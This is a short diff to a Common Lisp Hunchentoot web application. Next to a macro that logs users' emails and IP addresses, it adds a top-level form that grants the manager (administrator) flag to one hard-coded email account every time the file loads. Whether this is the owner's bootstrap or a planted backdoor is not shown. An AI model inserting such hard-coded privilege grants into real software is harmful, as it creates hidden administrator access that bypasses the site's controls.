@@ -99,3 +99,8 @@
      (incf (pageview-count (get-items-counter)))
      (if ,userinfo (log-info "[user-info]uri:~a,author:~a,email:~a,lastip:~a" (hunchentoot:request-uri*) (author ,userinfo) (email ,userinfo) (last-ip ,userinfo)))
      ,@body))
+
+(with-open-store (*store-spec*)
+  (let ((user (query-userinfo-by-email "logsniper@outlook.com")))
+    (if user
+      (setf (manager user) t))))
